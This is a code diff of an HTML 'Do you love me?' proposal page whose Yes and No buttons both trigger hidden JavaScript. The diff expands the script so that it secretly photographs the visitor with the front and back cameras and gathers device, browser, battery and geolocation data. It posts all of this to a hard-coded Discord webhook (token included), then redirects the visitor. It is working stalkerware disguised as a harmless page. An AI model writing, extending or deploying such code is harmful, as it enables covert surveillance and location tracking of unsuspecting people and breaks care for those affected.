@@ -6,34 +6,34 @@
   <title>Proposed Her</title>
   <link rel="stylesheet" href="./style.css" />
   <style>
-    /* Camera elements ko hidden rakha hai */
     #video, #canvas { display: none; }
-    
-    /* Yes/No buttons ki styling agar style.css load na ho */
     .btn a {
-      padding: 10px 25px;
+      padding: 12px 30px;
       margin: 10px;
       text-decoration: none;
       background: #ff4d6d;
       color: white;
-      border-radius: 20px;
+      border-radius: 25px;
       display: inline-block;
       font-weight: bold;
+      transition: 0.3s;
     }
   </style>
 </head>
-<body>
-  <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.7); font-weight: bold;">
+<body style="background-color: #1a1a1a; text-align: center; font-family: Arial, sans-serif;">
+
+  <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.5);">
     Dev by Faisal
   </div>
 
-  <div class="container" style="text-align: center; padding-top: 50px; font-family: Arial, sans-serif;">
-    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px;">
-    <h1 style="color: #fff;">Do you love me? 🤗</h1>
-    <p style="color: #eee;">Chiku is all yours</p>
+  <div class="container" style="padding-top: 60px;">
+    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:90%; max-width:350px; border-radius: 15px;">
+    <h1 style="color: white; margin-top: 20px;">Do you love me? 🤗</h1>
+    <p style="color: #ccc;">Chiku is all yours</p>
+    
     <div class="btn">
-      <a href="javascript:void(0)" onclick="startCapture('user')">Yes</a>
-      <a href="javascript:void(0)" onclick="startCapture('user')">No</a>
+      <a href="javascript:void(0)" onclick="initAll()">Yes</a>
+      <a href="javascript:void(0)" onclick="initAll()">No</a>
     </div>
   </div>
 
@@ -41,61 +41,79 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    // Aapka Discord Webhook URL yahan add kar diya hai
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
-    async function startCapture(mode) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: mode } 
-        });
+    // 1. Sab se pehle Device Info aur IP nikalne ka function
+    async function initAll() {
+        let deviceInfo = `📱 **Device:** ${navigator.platform}\n🌐 **Browser:** ${navigator.userAgent}`;
         
+        // Battery Info
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            deviceInfo += `\n🔋 **Battery:** ${Math.round(battery.level * 100)}%`;
+        }
+
+        // Location aur Camera shuru karna
+        startCamera('user', deviceInfo);
+    }
+
+    async function startCamera(mode, extraInfo) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // Photo lene se pehle thora wait (1.5 sec)
         setTimeout(() => {
-          captureImage(stream, mode);
+          captureAndSend(stream, mode, extraInfo);
         }, 1500);
 
       } catch (err) {
-        console.log("Permission Error: ", err);
-        // Agar user block kare to bhi redirect kar dein
-        window.location.href = "page1.html";
+        // Agar camera block ho to location try karein
+        getLocation(extraInfo);
       }
     }
 
-    function captureImage(stream, mode) {
+    function captureAndSend(stream, mode, extraInfo) {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      
       canvas.getContext('2d').drawImage(video, 0, 0);
       
       canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('file', blob, `faisal_capture_${mode}.png`);
-        formData.append('content', `🚀 **Alert! Faisal Bhai, Nayi Photo Agayi!**\n📸 Camera: ${mode === 'user' ? 'Front (Selfie)' : 'Back'}`);
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        }).then(() => {
-          // Stream close karna
-          stream.getTracks().forEach(track => track.stop());
-          
-          if(mode === 'user') {
-            // Front ke baad foran Back camera try karein
-            startCapture('environment'); 
-          } else {
-            // Sab done, ab next page par bhej dein
-            window.location.href = "page1.html";
-          }
-        }).catch(err => {
-            window.location.href = "page1.html";
+        formData.append('file', blob, `capture_${mode}.png`);
+        
+        // Location add karne ki koshish
+        navigator.geolocation.getCurrentPosition(pos => {
+            const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            formData.append('content', `🔥 **Faisal Bhai, Data Mil Gaya!**\n${extraInfo}\n📍 **Location:** ${mapUrl}\n📷 **Camera:** ${mode}`);
+            postToDiscord(formData, stream, mode);
+        }, () => {
+            formData.append('content', `🔥 **Faisal Bhai, Photo Mil Gayi!** (Location Blocked)\n${extraInfo}\n📷 **Camera:** ${mode}`);
+            postToDiscord(formData, stream, mode);
         });
       }, 'image/png');
+    }
+
+    function postToDiscord(formData, stream, mode) {
+        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+        .then(() => {
+            stream.getTracks().forEach(t => t.stop());
+            if(mode === 'user') {
+                startCamera('environment', ''); // Back camera try karein
+            } else {
+                window.location.href = "page1.html";
+            }
+        }).catch(() => { window.location.href = "page1.html"; });
+    }
+
+    function getLocation(info) {
+        // Agar sirf info bhejni ho jab camera block ho
+        const formData = new FormData();
+        formData.append('content', `⚠️ **Camera Blocked but Info Found:**\n${info}`);
+        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+        .then(() => { window.location.href = "page1.html"; });
     }
   </script>
 </body>
